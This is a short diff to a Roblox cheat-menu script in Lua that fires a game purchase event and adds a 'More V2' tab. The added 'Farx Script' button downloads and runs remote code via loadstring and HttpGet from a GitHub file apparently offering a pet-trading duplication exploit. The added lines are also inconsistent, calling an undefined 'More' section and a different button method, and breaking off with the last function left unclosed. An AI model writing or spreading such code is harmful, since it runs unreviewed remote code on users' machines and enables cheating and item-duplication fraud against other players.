@@ -360,3 +360,12 @@ ColoredSection:NewButton("Buy colored Headphones", "Requires idk", function()
     
     game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Coin"):WaitForChild("CoinMarketRE"):FireServer(unpack(args))
 end)
+
+local Script = Window:NewTab("More V2") local ScriptSection = More:NewSection("Script")
+ScriptSection:Button("Trade Value", function() 
+game.Players.localPlayer.XRay.Value = true
+
+end)
+
+ScriptSection:Button("Farx Script", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Dupess/main/PetTrading"))()
